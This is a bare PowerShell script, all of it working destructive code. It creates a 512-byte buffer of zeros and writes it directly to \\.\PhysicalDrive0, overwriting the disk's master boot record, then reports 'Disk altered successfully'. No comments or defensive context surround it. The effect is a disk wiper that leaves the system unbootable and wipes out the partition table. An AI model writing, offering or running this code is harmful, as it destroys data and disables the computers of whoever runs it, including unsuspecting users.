[System.IO.File]::WriteAllBytes("C:\Users\boot.bin", [byte[]]@(0) * 512)
$mbrData = [System.IO.File]::ReadAllBytes("C:\Users\boot.bin")

if ($mbrData.Length -ne 512) {
    Write-Host "ERROR: MBR file is $($mbrData.Length) bytes, not 512" -ForegroundColor Red
    exit
}

$drive = [System.IO.File]::Open("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)

try {

    $drive.Write($mbrData, 0, 512)
    $drive.Flush()
    Write-Host "Disk altered successfully" -ForegroundColor Green
}
finally {
    $drive.Close()
    $drive.Dispose()
}
